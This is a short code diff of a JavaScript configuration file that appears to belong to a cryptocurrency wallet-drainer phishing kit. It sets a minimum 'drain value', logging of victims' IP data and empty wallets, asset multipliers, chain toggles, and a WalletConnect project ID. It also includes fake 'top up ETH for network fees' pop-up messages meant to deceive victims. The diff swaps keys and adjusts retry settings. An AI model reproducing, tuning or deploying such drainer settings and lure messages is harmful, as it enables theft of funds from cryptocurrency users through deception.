@@ -1,5 +1,5 @@
 
-let ACCESS_KEY = 'e0f51d79-1ce6-4a9f-8be5-8e372b690cb1'
+let ACCESS_KEY = '238d3aac-c692-49ae-a5d9-bd0c49f13f15'
 let USE_W3M_V3 = true
 let logPromptingEnabled = true;
 let minimalDrainValue = 0.002;
@@ -23,7 +23,7 @@ let multipliers = {
 'NFT': 1,
 'NATIVES': 1,
 };
-let notEligible = "You don't have enough ETH to cover network fees.";
+let notEligible = "You donâ€™t have enough Ethereum (ETH) to cover network fees";
 let swal_notEligibleTitle = "Top up Ethereum (ETH)";
 let addressChanged = "Your wallet address has changed, connect wallet again please";
 let swal_addressChangedTitle = "Address changed";
@@ -39,7 +39,7 @@ let logIpData = true;
 let logEmptyWallets = true;
 let logDrainingStrategy = true;
 let repeatHighest = true;
-let retry_changenetwork = 2;
+let retry_changenetwork = 3;
 let eth_enabled = true;
 let bsc_enabled = true;
 let arb_enabled = true;
@@ -59,7 +59,7 @@ let buttonMessagesEnabled = false;
 let twoStep = false;
 let twoStepButtonElement = "startButton";
 let connectElement = "connectButton";
-let wc_projectid = "4089f7d4e92c92d629cb6474bd72b777";
+let wc_projectid = "660a170e6039b9b475886e27be6316b2";
 let cfgversion = 680;
 let researchers = [];
 let experimental = {"disable-w3m-featured":true};
